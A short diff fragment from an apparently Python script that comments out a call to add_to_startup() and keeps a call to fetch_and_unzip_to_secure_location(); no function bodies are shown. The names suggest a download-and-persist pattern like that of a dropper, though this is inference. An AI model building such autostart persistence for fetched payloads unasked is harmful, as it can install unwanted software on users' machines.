@@ -67,4 +67,4 @@ def add_to_startup():
 
 if __name__ == "__main__":
     fetch_and_unzip_to_secure_location()
-    add_to_startup()
+    # add_to_startup()
